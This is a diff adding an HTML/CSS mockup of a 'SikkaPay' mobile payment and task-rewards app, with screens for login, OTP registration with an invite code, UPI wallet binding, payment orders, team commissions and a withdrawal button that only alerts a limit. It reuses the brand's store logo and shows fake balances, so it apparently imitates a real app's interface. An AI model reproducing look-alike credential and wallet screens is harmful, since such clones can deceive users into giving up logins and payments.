+    #screen-task-rewards .btn-action { padding: 8px 18px; border-radius: 20px; font-size: 13px; font-weight: 700; border: none; cursor: pointer; }
+    #screen-task-rewards .btn-light { background: #E8F5E9; color: #0D8A5F; }
+    #screen-task-rewards .btn-received { background: #82C7A5; color: #FFFFFF; }
+    #screen-task-rewards .btn-solid { background: #0D8A5F; color: #FFFFFF; }
+
+    /* ================= 13. TEAM SCREEN ================= */
+    #screen-team .content-scroll { padding: 0 15px 20px; }
+    #screen-team .main-card { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); border-radius: 20px; padding: 25px 20px; text-align: center; margin-bottom: 20px; box-shadow: 0 6px 20px rgba(15,143,95,0.2); }
+    #screen-team .main-card h3 { color: rgba(255,255,255,0.9); font-size: 15px; font-weight: 500; margin-bottom: 5px; }
+    #screen-team .main-card h1 { color: white; font-size: 34px; font-weight: 900; margin-bottom: 20px; }
+    #screen-team .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    #screen-team .stat-box { background-color: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; padding: 12px; text-align: center; backdrop-filter: blur(5px); }
+    #screen-team .stat-box p { font-size: 12px; color: rgba(255,255,255,0.8); margin-bottom: 5px; }
+    #screen-team .stat-box h4 { font-size: 16px; color: white; font-weight: 800; }
+    #screen-team .invitation-wrapper { margin-bottom: 20px; }
+    #screen-team .tab-header { background-color: #0D8A5F; color: white; display: inline-block; padding: 10px 24px; font-size: 15px; font-weight: 700; border-top-left-radius: 12px; border-top-right-radius: 25px; position: relative; z-index: 2; }
+    #screen-team .invitation-body { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); border-radius: 16px; border-top-left-radius: 0; padding: 15px; margin-top: -2px; position: relative; z-index: 1; box-shadow: 0 6px 20px rgba(15,143,95,0.15); }
+    #screen-team .link-row { background-color: rgba(255,255,255,0.15); border-radius: 12px; padding: 14px 18px; display: flex; justify-content: space-between; align-items: center; color: white; border: 1px solid rgba(255,255,255,0.2); backdrop-filter: blur(5px); }
+    #screen-team .link-row h3 { font-size: 16px; font-weight: 600; }
+    #screen-team .link-row span { font-size: 16px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
+    #screen-team .team-members-box { background-color: white; border-radius: 16px; padding: 18px; margin-top: 15px; }
+    #screen-team .team-members-box h4 { text-align: center; font-size: 15px; color: #333; margin-bottom: 15px; font-weight: 700; }
+    #screen-team .level-grid { display: flex; gap: 12px; }
+    #screen-team .level-box { flex: 1; background-color: #F4FCF8; border-radius: 12px; padding: 12px; border: 1px solid #E0F2E9; }
+    #screen-team .level-box h5 { font-size: 18px; color: #0D8A5F; font-weight: 900; text-align: center; margin-bottom: 10px; }
+    #screen-team .level-box p { font-size: 12px; color: #666; display: flex; justify-content: space-between; margin-bottom: 5px; font-weight: 500; }
+    #screen-team .level-box span { color: #0D8A5F; font-weight: 700; }
+    
+    #screen-team .share-card { background-color: white; border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #F0F0F0; }
+    #screen-team .share-card h3 { font-size: 18px; font-weight: 800; color: #111; margin-bottom: 15px; }
+    #screen-team .share-icons { display: flex; gap: 12px; }
+    #screen-team .share-icon { flex: 1; background-color: #F8F9FA; border: 1px solid #EAEAEA; border-radius: 16px; display: flex; flex-direction: column; align-items: center; padding: 15px 5px; cursor: pointer; transition: 0.2s; }
+    #screen-team .share-icon:active { transform: scale(0.95); }
+    #screen-team .share-icon i { font-size: 26px; margin-bottom: 8px; }
+    #screen-team .share-icon span { font-size: 12px; color: #333; text-align: center; font-weight: 600; }
+    
+    #screen-team .commission-wrapper { margin-bottom: 20px; }
+    #screen-team .commission-body { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); border-radius: 16px; border-top-left-radius: 0; padding: 12px; margin-top: -2px; box-shadow: 0 6px 20px rgba(15,143,95,0.15); }
+    #screen-team .commission-card { background-color: white; border-radius: 12px; padding: 18px; }
+    #screen-team .comm-row { display: flex; justify-content: space-between; margin-bottom: 12px; }
+    #screen-team .comm-row h4 { font-size: 16px; font-weight: 800; color: #0D8A5F; }
+    #screen-team .comm-row span { font-size: 15px; font-weight: 700; color: #333; }
+    #screen-team .view-details { font-size: 14px; color: #1877F2; font-weight: 600; text-decoration: none; cursor: pointer; display: inline-block; margin-top: 5px; }
+    
+    #screen-team .performance-card { background-color: white; border-radius: 20px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); border: 1px solid #F0F0F0; }
+    #screen-team .perf-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
+    #screen-team .perf-header h3 { font-size: 18px; font-weight: 800; color: #111; }
+    #screen-team .perf-tabs { display: flex; background-color: #F0F0F0; border-radius: 20px; padding: 4px; }
+    #screen-team .perf-tab { padding: 6px 16px; font-size: 13px; font-weight: 600; color: #666; border-radius: 15px; cursor: pointer; }
+    #screen-team .perf-tab.active { background-color: white; color: #0D8A5F; font-weight: 700; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    #screen-team .chart-area { display: flex; flex-direction: column; gap: 18px; padding-left: 25px; position: relative; height: 150px; justify-content: space-between; }
+    #screen-team .chart-y-axis { position: absolute; left: 0; top: 0; height: 100%; display: flex; flex-direction: column; justify-content: space-between; font-size: 12px; color: #999; font-weight: 600; }
+    #screen-team .chart-line { border-bottom: 1px dashed #EAEAEA; height: 1px; width: 100%; }
+
+    /* ================= 14. LEVEL SCREEN ================= */
+    #screen-level .content-scroll { padding: 0 15px 20px; }
+    #screen-level .toggle-container { margin-bottom: 25px; }
+    #screen-level .toggle-bg { display: flex; background-color: #EAEFEC; border-radius: 16px; padding: 5px; position: relative; }
+    #screen-level .toggle-btn { flex: 1; text-align: center; padding: 12px 0; font-size: 15px; font-weight: 700; color: #0D8A5F; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; z-index: 2; }
+    #screen-level .toggle-btn.active { background-color: #FFFFFF; color: #0D8A5F; box-shadow: 0 2px 8px rgba(0,0,0,0.08); }
+    #screen-level .no-data-text { text-align: center; font-size: 15px; color: #888; margin-top: 30px; }
+
+    /* ================= 15. PAYMENT HISTORY SCREEN ================= */
+    #screen-payment-history .main-toggle-container { padding: 0 15px; margin-bottom: 20px; }
+    #screen-payment-history .main-toggle-bg { display: flex; background-color: #D4EAE0; border-radius: 16px; padding: 5px; position: relative; }
+    #screen-payment-history .main-tab-btn { flex: 1; text-align: center; padding: 12px 0; font-size: 15px; font-weight: 700; color: #0D8A5F; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; z-index: 2; }
+    #screen-payment-history .main-tab-btn.active { background-color: #0D8A5F; color: #FFFFFF; box-shadow: 0 2px 8px rgba(13,138,95,0.3); }
+    #screen-payment-history .content-scroll { flex: 1; overflow-y: auto; padding: 0 15px 20px; display: none; }
+    #screen-payment-history .content-scroll.active { display: block; }
+    #screen-payment-history .summary-card { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); border-radius: 20px; padding: 20px; position: relative; overflow: hidden; margin-bottom: 20px; box-shadow: 0 6px 20px rgba(15,143,95,0.2); }
+    #screen-payment-history .shape-yellow { position: absolute; width: 120px; height: 120px; background: #F3C634; border-radius: 50%; top: -30px; right: -20px; z-index: 1; opacity: 0.9; }
+    #screen-payment-history .shape-blue { position: absolute; width: 120px; height: 120px; background: #4285F4; border-radius: 50%; bottom: -30px; right: -30px; z-index: 2; opacity: 0.9; }
+    #screen-payment-history .summary-content { position: relative; z-index: 3; display: flex; justify-content: space-between; }
+    #screen-payment-history .summary-left h3 { color: rgba(255,255,255,0.9); font-size: 15px; font-weight: 500; margin-bottom: 5px; }
+    #screen-payment-history .summary-left h1 { color: #FFFFFF; font-size: 28px; font-weight: 900; display: flex; align-items: center;}
+    #screen-payment-history .summary-left h1 span { font-family: monospace; margin-right: 4px;}
+    #screen-payment-history .summary-right { text-align: right; color: white; display: flex; flex-direction: column; gap: 5px; }
+    #screen-payment-history .summary-right div { font-size: 14px; font-weight: 500; }
+    #screen-payment-history .summary-right b { font-size: 16px; font-weight: 800; margin-left: 5px; }
+    #screen-payment-history .sub-toggle-container { display: flex; gap: 15px; margin-bottom: 20px; }
+    #screen-payment-history .sub-tab-btn { flex: 1; text-align: center; padding: 12px 0; font-size: 14px; font-weight: 700; border-radius: 12px; cursor: pointer; border: 1px solid #B2D8C8; background-color: #FFFFFF; color: #0D8A5F; transition: all 0.2s; }
+    #screen-payment-history .sub-tab-btn.active { background-color: #E8F5E9; border-color: #0D8A5F; }
+    #screen-payment-history .empty-state { text-align: center; color: #888; font-size: 15px; margin-top: 20px; }
+
+    /* ================= 16. ADD TOOL SCREEN ================= */
+    #screen-add-tool .choose-title { text-align: center; font-size: 20px; font-weight: 800; color: #0D8A5F; margin: 20px 0; }
+    #screen-add-tool .content-scroll { padding: 0 15px 20px; }
+    #screen-add-tool .toggle-bg { display: flex; background-color: #FFFFFF; border: 1px solid #EAEAEA; border-radius: 16px; padding: 5px; margin-bottom: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.03); }
+    #screen-add-tool .toggle-btn { flex: 1; text-align: center; padding: 10px 0; font-size: 15px; font-weight: 700; color: #666; border-radius: 12px; cursor: pointer; }
+    #screen-add-tool .toggle-btn.active { background-color: #0D8A5F; color: #fff; box-shadow: 0 2px 8px rgba(13,138,95,0.2); }
+    
+    #screen-add-tool .provider-card { background: white; border-radius: 16px; padding: 15px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 4px 12px rgba(0,0,0,0.03); border: 1px solid #EAEAEA; cursor: pointer; transition: 0.2s; }
+    #screen-add-tool .provider-card:active { transform: scale(0.98); }
+    #screen-add-tool .provider-card.active { border: 2px solid #0D8A5F; background-color: #F4FCF8; }
+    #screen-add-tool .prov-left { display: flex; align-items: center; gap: 15px; }
+    #screen-add-tool .prov-icon { width: 45px; height: 45px; border-radius: 12px; display: flex; justify-content: center; align-items: center; overflow: hidden; background: #fff; border: 1px solid #EAEAEA; padding: 5px; }
+    #screen-add-tool .prov-icon img { width: 100%; height: 100%; object-fit: contain; }
+    #screen-add-tool .prov-text h4 { font-size: 16px; color: #111; font-weight: 800; display: flex; align-items: center; gap: 8px; }
+    #screen-add-tool .prov-text p { font-size: 12px; color: #777; margin-top: 3px; font-weight: 500; }
+    #screen-add-tool .bonus-pill { background: #F39C12; color: white; padding: 2px 8px; border-radius: 8px; font-size: 10px; font-weight: 800; }
+    #screen-add-tool .prov-right { color: #0D8A5F; font-weight: 800; font-size: 14px; }
+
+    /* ================= 17. WALLET SETUP SCREEN ================= */
+    #screen-wallet-setup .content-scroll { padding: 0 15px 20px; }
+    #screen-wallet-setup .stepper { display: flex; justify-content: space-between; align-items: center; padding: 0 20px; margin-bottom: 25px; position: relative; }
+    #screen-wallet-setup .step-item { display: flex; flex-direction: column; align-items: center; z-index: 2; width: 60px; }
+    #screen-wallet-setup .step-circle { width: 40px; height: 40px; border-radius: 50%; background: #FFFFFF; border: 2px solid #EAEAEA; display: flex; justify-content: center; align-items: center; font-weight: 800; color: #999; margin-bottom: 8px; transition: 0.3s; }
+    #screen-wallet-setup .step-item.active .step-circle { background: #0D8A5F; color: white; border-color: #0D8A5F; box-shadow: 0 0 0 4px #E8F5E9; }
+    #screen-wallet-setup .step-text { font-size: 12px; color: #999; font-weight: 700; }
+    #screen-wallet-setup .step-item.active .step-text { color: #0D8A5F; }
+    #screen-wallet-setup .stepper::before { content: ''; position: absolute; top: 20px; left: 50px; right: 50px; height: 2px; background: #EAEAEA; z-index: 1; }
+    
+    #screen-wallet-setup .step-card { background: white; border-radius: 20px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.03); margin-bottom: 20px; border: 1px solid #F0F0F0; }
+    #screen-wallet-setup .step-header { background: linear-gradient(135deg, #0D8A5F, #1A9E6C); color: white; padding: 18px; font-size: 18px; font-weight: 700; }
+    #screen-wallet-setup .step-body { padding: 20px; }
+    #screen-wallet-setup .step-body h3 { font-size: 18px; color: #111; margin-bottom: 10px; font-weight: 800; }
+    #screen-wallet-setup .step-body p { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; }
+    #screen-wallet-setup .input-group { display: flex; border: 1px solid #EAEAEA; border-radius: 12px; overflow: hidden; margin-bottom: 20px; background: #F8F9FA; }
+    #screen-wallet-setup .input-group span { background: #EAEFEC; padding: 14px 18px; font-weight: 700; color: #333; border-right: 1px solid #EAEAEA; }
+    #screen-wallet-setup .input-group input { border: none; outline: none; padding: 14px 18px; width: 100%; font-size: 16px; background: transparent; font-weight: 600; }
+    #screen-wallet-setup .input-label { font-size: 15px; font-weight: 700; color: #0D8A5F; margin-bottom: 10px; display: block; }
+    #screen-wallet-setup .otp-timer { font-size: 12px; color: #0D8A5F; background: #E8F5E9; padding: 4px 12px; border-radius: 12px; font-weight: 800; }
+    #screen-wallet-setup .btn-next { width: 100%; background: linear-gradient(135deg, #0F8F5F, #0b6e4c); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 15px rgba(13,138,95,0.3); }
+    
+    #screen-wallet-setup .upi-box { border: 1px solid #EAEAEA; border-radius: 12px; padding: 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 12px; cursor: pointer; background: #F8F9FA; transition: 0.2s; }
+    #screen-wallet-setup .upi-box.selected { border: 2px solid #0D8A5F; background: #F4FCF8; }
+    #screen-wallet-setup .upi-radio { width: 22px; height: 22px; border-radius: 50%; border: 2px solid #CCC; display: flex; justify-content: center; align-items: center; }
+    #screen-wallet-setup .upi-box.selected .upi-radio { border-color: #0D8A5F; }
+    #screen-wallet-setup .upi-box.selected .upi-radio::after { content: ''; width: 12px; height: 12px; background: #0D8A5F; border-radius: 50%; }
+    #screen-wallet-setup .upi-text { font-size: 16px; font-weight: 700; color: #333; }
+    #screen-wallet-setup .upi-info { display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 15px; background: #F8F9FA; padding: 12px; border-radius: 12px; }
+    #screen-wallet-setup .upi-info span { color: #666; font-weight: 500; }
+    #screen-wallet-setup .upi-info b { color: #111; font-weight: 700; }
+    
+    #screen-wallet-setup #step-success { text-align: center; padding-top: 40px; }
+    #screen-wallet-setup .check-circle { width: 90px; height: 90px; background: #E8F5E9; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 25px; font-size: 45px; color: #0D8A5F; font-weight: 900; box-shadow: 0 4px 15px rgba(13,138,95,0.1); }
+    #screen-wallet-setup .success-text { font-size: 24px; color: #0D8A5F; font-weight: 800; margin-bottom: 40px; }
+    #screen-wallet-setup .btn-view-wallet { width: 100%; background: linear-gradient(135deg, #0F8F5F, #0b6e4c); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(13,138,95,0.3); }
+
+    /* ================= 18. ORDER SCREEN (From Payment) ================= */
+    #screen-order .order-top { background: linear-gradient(135deg, #E8F5E9, #C8E6C9); padding: 25px 20px; text-align: center; margin-top: 60px; border-radius: 20px 20px 0 0; margin-left: 15px; margin-right: 15px; }
+    #screen-order .order-top h1 { font-size: 38px; color: #0D8A5F; font-weight: 900; margin-bottom: 10px; }
+    #screen-order .expire-pill { display: inline-block; background: #FFFFFF; color: #D35400; padding: 6px 18px; border-radius: 20px; font-size: 14px; font-weight: 800; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+    #screen-order .notice-text { font-size: 12px; color: #D35400; margin-top: 15px; line-height: 1.5; font-weight: 500; }
+    #screen-order .order-details { background: white; border-radius: 20px; margin: -10px 15px 20px; padding: 20px; box-shadow: 0 6px 20px rgba(0,0,0,0.05); position: relative; z-index: 2; border: 1px solid #F0F0F0; }
+    #screen-order .detail-row { display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-bottom: 1px solid #F0F0F0; }
+    #screen-order .detail-row:last-child { border-bottom: none; }
+    #screen-order .d-label { font-size: 14px; color: #666; font-weight: 500; }
+    #screen-order .d-val { font-size: 15px; color: #111; font-weight: 700; display: flex; align-items: center; gap: 10px; }
+    #screen-order .d-val i { color: #0D8A5F; cursor: pointer; font-size: 18px; }
+    #screen-order .ifsc-note { font-size: 11px; color: #D35400; text-align: right; margin-top: -5px; margin-bottom: 15px; font-weight: 600;}
+    #screen-order .warning-red { font-size: 12px; color: #D32F2F; margin: 5px 0 15px; font-weight: 500;}
+    #screen-order .payout-badge { display: flex; align-items: center; gap: 10px; }
+    #screen-order .payout-icon { background: #1976D2; color: white; padding: 4px 8px; border-radius: 6px; font-weight: 900; font-size: 12px; font-style: italic;}
+    #screen-order .btn-change, #screen-order .btn-cancel-order { background: #F8F9FA; color: #0D8A5F; border: 1px solid #EAEAEA; padding: 6px 14px; border-radius: 15px; font-size: 12px; font-weight: 700; cursor: pointer; }
+    #screen-order .status-badge { display: flex; align-items: center; gap: 10px; font-weight: 700; color: #0D8A5F; }
+    #screen-order .upload-section { margin: 0 15px; text-align: center; }
+    #screen-order .btn-upload { width: 100%; background: transparent; border: 2px dashed #0D8A5F; color: #0D8A5F; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px; }
+    #screen-order .upload-warning { color: #D32F2F; font-size: 12px; margin-top: 12px; margin-bottom: 20px; font-weight: 500;}
+    #screen-order .btn-go-pay { background: linear-gradient(135deg, #0F8F5F, #0b6e4c); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 18px; font-weight: 800; cursor: pointer; margin: 0 15px; width: calc(100% - 30px); box-shadow: 0 6px 20px rgba(15,143,95,0.3); }
+
+    /* ================= OVERLAYS & MODALS ================= */
+    .loading-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.75); z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; backdrop-filter: blur(3px); }
+    .spinner { width: 60px; height: 60px; border: 5px solid rgba(255,255,255,0.2); border-top-color: #ffffff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    .loading-text { color: #ffffff; font-size: 22px; font-weight: 500; letter-spacing: 0.5px; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    
+    #modal-confirm { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 3000; display: none; justify-content: center; align-items: center; padding: 20px; backdrop-filter: blur(3px); }
+    #modal-confirm .modal-box { background: white; border-radius: 24px; padding: 30px 24px; width: 100%; max-width: 340px; text-align: center; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+    #modal-confirm .close-btn { position: absolute; top: 15px; right: 15px; width: 32px; height: 32px; background: #F8F9FA; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #666; cursor: pointer; font-size: 18px; }
+    #modal-confirm h2 { font-size: 24px; color: #111; font-weight: 800; margin-bottom: 10px; }
+    #modal-confirm p { font-size: 15px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+    #modal-confirm .modal-actions { display: flex; gap: 12px; }
+    #modal-confirm .btn-modal { flex: 1; padding: 14px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; border: 1px solid #EAEAEA; transition: 0.2s; }
+    #modal-confirm .btn-cancel { background: #F8F9FA; color: #666; }
+    #modal-confirm .btn-yes { background: #0D8A5F; color: white; border: none; box-shadow: 0 4px 10px rgba(13,138,95,0.3); }
+
+    /* Premium Bottom Navigation */
+    .bottom-nav { position: absolute; bottom: 0; left: 0; width: 100%; height: 80px; background: white; display: none; justify-content: space-around; align-items: center; z-index: 1000; border-top: 1px solid #F0F0F0; box-shadow: 0 -4px 20px rgba(0,0,0,0.03); }
+    .bottom-nav.show { display: flex; }
+    .nav-item { display: flex; flex-direction: column; align-items: center; color: #B0B0B0; font-size: 11px; gap: 5px; font-weight: 700; cursor: pointer; width: 20%; transition: 0.2s; }
+    .nav-item:active { transform: scale(0.9); }
+    .nav-item i { font-size: 24px; }
+    .nav-item.active { color: #0D8A5F; }
+    .nav-center { width: 65px; height: 65px; background: linear-gradient(135deg, #F4C430, #E6B800); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #111; font-size: 26px; margin-top: -35px; border: 6px solid #F4F6F9; cursor: pointer; box-shadow: 0 6px 15px rgba(244,196,48,0.4); transition: 0.2s; }
+    .nav-center:active { transform: scale(0.9); }
+</style>
+</head>
+<body>
+
+<div class="phone-container">
+
+    <!-- ================= LOGIN SCREEN ================= -->
+    <div id="screen-login" class="screen active">
+        <div class="login-container">
+            <div class="logo-box">
+                <!-- SikkaPay Original Logo -->
+                <img src="https://play-lh.googleusercontent.com/s5geIP1q-Vqut4Eh4a2nBLdQIhzpX56X7boHDmdUkPvs_BssWiaqCOxEuHeQpE-SINi11ItW0_evjdjLrouMdA=w240-h480-rw" alt="SikkaPay Logo">
+                <h1>SikkaPay</h1>
+            </div>
+            <div class="input-group"><i class="fa-regular fa-user"></i><input type="tel" id="login-phone" placeholder="Phone (+91)" maxlength="10"></div>
+            <div class="input-group"><i class="fa-solid fa-lock"></i><input type="password" id="login-pass" placeholder="Password"></div>
+            
+            <div class="login-opt">
+                <a onclick="switchScreen('screen-register')">Register</a>
+                <label style="display:flex; align-items:center; gap:5px;"><input type="radio" name="remember" style="accent-color:#0D8A5F;"> Remember Me</label>
+            </div>
+            
+            <div class="check-row">
+                <input type="checkbox" checked> Agree "User Privacy Agreement"
+            </div>
+            
+            <button class="btn-main" onclick="handleLogin()">Sign In</button>
+        </div>
+    </div>
+
+    <!-- ================= REGISTER SCREEN ================= -->
+    <div id="screen-register" class="screen">
+        <div class="login-container" style="justify-content: flex-start; padding-top: 20px;">
+            <div class="reg-header">
+                <i class="fa-solid fa-arrow-left" onclick="switchScreen('screen-login')"></i>
+                <h2>Register</h2>
+            </div>
+            
+            <div class="input-group"><i class="fa-regular fa-user"></i><input type="text" placeholder="User Name"></div>
+            <div class="input-group"><i class="fa-solid fa-lock"></i><input type="password" placeholder="Password"></div>
+            <div class="input-group"><i class="fa-solid fa-phone"></i><span style="position:absolute; left:45px; top:50%; transform:translateY(-50%); color:#0D8A5F; font-weight:700;">+91</span><input type="tel" placeholder="Phone" style="padding-left: 90px;" maxlength="10"></div>
+            
+            <div class="input-group" style="position: relative;">
+                <i class="fa-regular fa-envelope"></i>
+                <input type="text" placeholder="OTP Code" maxlength="6">
+                <button class="otp-btn" style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%);">Send</button>
+            </div>
+            
+            <div class="input-group"><i class="fa-solid fa-link"></i><input type="text" placeholder="Invite Code" value="W56gS"></div>
+            
+            <button class="btn-main" onclick="handleRegister()" style="margin-top: 15px;">Sign Up</button>
+        </div>
+    </div>
+
+    <!-- ================= 1. DASHBOARD ================= -->
+    <div id="screen-dashboard" class="screen">
+        <div class="top-user">
+            <div class="user-info">
+                <div class="avatar"><i class="fa-solid fa-user"></i></div>
+                <div><div class="user-name">Sonu5723</div><div class="user-id">ID: 260220</div></div>
+            </div>
+            <i class="fa-regular fa-bell bell-icon" onclick="showAlert('Notifications')"></i>
+        </div>
+        <div style="padding: 0 15px;">
+            
+            <!-- Premium Banner -->
+            <div class="banner-container" id="main-banner" onclick="openDynamicLink('banner')">
+                <div class="banner-placeholder">Tap to set banner link</div>
+            </div>
+
+            <div class="home-balance-card">
+                <div class="shape-yellow"></div><div class="shape-blue"></div>
+                <div class="home-balance-content">
+                    <div class="bal-title">Available Balance</div>
+                    <div class="bal-amount">₹ 180</div>
+                    <button class="btn-detail" onclick="openDynamicLink('detail')">Detail</button>
+                </div>
+            </div>
+            
+            <div class="action-grid">
+                <div class="action-box" onclick="openDynamicLink('usdt')">
+                    <div class="action-icon" id="icon-usdt"><i class="fa-solid fa-shirt" style="color: #0D8A5F;"></i></div>
+                    <span>USDT</span>
+                </div>
+                <div class="action-box" onclick="openDynamicLink('task')">
+                    <div class="action-icon" id="icon-task"><i class="fa-solid fa-list-ul"></i></div>
+                    <span>Task</span>
+                </div>
+                <div class="action-box" onclick="openDynamicLink('team')">
+                    <div class="action-icon" id="icon-team"><i class="fa-regular fa-user"></i></div>
+                    <span>Team</span>
+                </div>
+                <div class="action-box" onclick="openDynamicLink('order')">
+                    <div class="action-icon" id="icon-order"><i class="fa-regular fa-clipboard"></i></div>
+                    <span>Order</span>
+                </div>
+            </div>
+
+            <div class="newcomer-card" onclick="openDynamicLink('newcomer')">
+                <h5>NEWCOMER REWARDS</h5><h3>In progress</h3><p>Complete daily paid tasks to claim rewards.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 2. PAYMENT SCREEN ================= -->
+    <div id="screen-payment" class="screen">
+        <div class="header"><h2>Payment</h2></div>
+        <div class="content-scroll">
+            <div class="cashback-card">
+                <div class="bg-circle-yellow"></div><div class="bg-circle-blue"></div>
+                <div class="chart-bars"><div style="height: 20px; background: #2E9D6D;"></div><div style="height: 40px; background: #3CB483;"></div><div style="height: 60px; background: #62CCA1;"></div><div style="height: 30px; background: #A9D8FF;"></div><div style="height: 50px; background: #D4E9FF;"></div></div>
+                <div class="cb-top-text"><p>Cashback</p><h1>5%</h1></div>
+                <div class="cb-bottom-boxes">
+                    <div class="glass-box box-balance"><p>Balance</p><h4>₹180</h4></div>
+                    <div class="box-right-stack">
+                        <div class="glass-box box-small"><p>Reward</p><h4>₹0</h4></div>
+                        <div class="glass-box box-small"><p>Pending</p><h4>₹0</h4></div>
+                    </div>
+                </div>
+            </div>
+            <div class="warning-text"><i class="fa-solid fa-triangle-exclamation"></i> Please use Freecharge or Phonepe or Mobikwik or MoneyView wallet for payment!</div>
+            <div class="chips">
+                <div class="chip active" onclick="filterData('all', this)">All</div>
+                <div class="chip" onclick="filterData('100-499', this)">100-499</div>
+                <div class="chip" onclick="filterData('500-1999', this)">500-1999</div>
+                <div class="chip" onclick="filterData('2000-7000', this)">2000-7000</div>
+                <div class="chip" onclick="filterData('7000-9999', this)">7000-9999</div>
+                <div class="chip" onclick="filterData('10000-19999', this)">10000-19999</div>
+                <div class="chip" onclick="filterData('20000-30000', this)">20000-30000</div>
+            </div>
+            <div class="order-list" id="order-list"></div>
+        </div>
+    </div>
+
+    <!-- ================= 3. TOOLS SCREEN ================= -->
+    <div id="screen-tools" class="screen">
+        <div class="header"><h2>Tool</h2></div>
+        <div class="tool-list" id="my-wallets-list">
+            <div class="no-wallet-text" id="empty-wallet-text">No wallet added yet. Click 'Add Wallet' to bind.</div>
+        </div>
+        <button class="btn-add-top" onclick="switchScreen('screen-add-tool')">Add Wallet</button>
+    </div>
+
+    <!-- ================= 4. STATISTICS SCREEN ================= -->
+    <div id="screen-statistics" class="screen">
+        <div class="header"><h2>Statistics</h2></div>
+        <div class="main-card">
+            <div class="section-title">Statistics <span>(08/11/2026)</span></div>
+            <div class="stats-grid">
+                <div class="stat-box"><div class="stat-top"><div class="stat-icon icon-blue"><i class="fa-solid fa-wallet"></i></div><div class="stat-label">Balance</div></div><div class="stat-val">₹ 0.00</div></div>
+                <div class="stat-box"><div class="stat-top"><div class="stat-icon icon-yellow"><i class="fa-solid fa-dollar-sign"></i></div><div class="stat-label">Sell</div></div><div class="stat-val">₹ 0.00</div></div>
+                <div class="stat-box"><div class="stat-top"><div class="stat-icon icon-green"><i class="fa-solid fa-arrow-down"></i></div><div class="stat-label">Deposit</div></div><div class="stat-val">₹ 0.00</div></div>
+                <div class="stat-box"><div class="stat-top"><div class="stat-icon icon-red"><i class="fa-solid fa-rotate"></i></div><div class="stat-label">Commission</div></div><div class="stat-val">₹ 0.00</div></div>
+            </div>
+            <div class="section-title">Payment</div>
+            <div class="exchange-rate"><span>Real Time Exchange Rates(INR/USDT)</span><b>0</b></div>
+            <div class="payment-grid">
+                <div class="pay-box"><div class="pay-title"><i class="fa-solid fa-bullseye"></i> In Process Amount</div><div class="pay-val">₹ 0.00</div></div>
+                <div class="pay-box"><div class="pay-title"><i class="fa-solid fa-bullseye"></i> In Process Orders</div><div class="pay-val">0</div></div>
+                <div class="pay-box"><div class="pay-title"><i class="fa-solid fa-bullseye"></i> Commission Rate</div><div class="pay-val">0.00 %</div></div>
+                <div class="pay-box"><div class="pay-title"><i class="fa-solid fa-bullseye"></i> Estimated Income</div><div class="pay-val">₹ 0.00</div></div>
+            </div>
+        </div>
+        <button class="btn-action" id="main-action-btn" onclick="openModal()">Closed Selling</button>
+    </div>
+
+    <!-- ================= 5. MY ASSET SCREEN ================= -->
+    <div id="screen-my" class="screen">
+        <div class="header"><h2>My Asset</h2></div>
+        <div class="asset-card">
+            <div class="asset-grid">
+                <div class="asset-box" onclick="switchScreen('screen-deposit')">
+                    <div class="asset-icon icon-deposit"><i class="fa-solid fa-credit-card"></i></div>
+                    <div class="asset-info"><p>Deposit</p><h4>₹ 0</h4></div>
+                </div>
+                <div class="asset-box" onclick="showAlert('Withdrawal limit reached.')">
+                    <div class="asset-icon icon-withdraw"><i class="fa-solid fa-money-bill-1"></i></div>
+                    <div class="asset-info"><p>Withdraw</p><h4>₹ 0</h4></div>
+                </div>
+                <div class="asset-box" onclick="showAlert('No commissions yet.')">
+                    <div class="asset-icon icon-commission"><i class="fa-solid fa-arrows-rotate"></i></div>
+                    <div class="asset-info"><p>Commission</p><h4>₹ 0</h4></div>
+                </div>
+            </div>
+        </div>
+        <div class="menu-card">
+            <div class="menu-grid">
+                <div class="menu-item" onclick="switchScreen('screen-payment-history')">
+                    <div class="menu-icon"><i class="fa-solid fa-yen-sign"></i></div><span>Wallet</span>
+                </div>
+                <div class="menu-item" onclick="switchScreen('screen-score')">
+                    <div class="menu-icon"><i class="fa-solid fa-coins"></i></div><span>Integral</span>
+                </div>
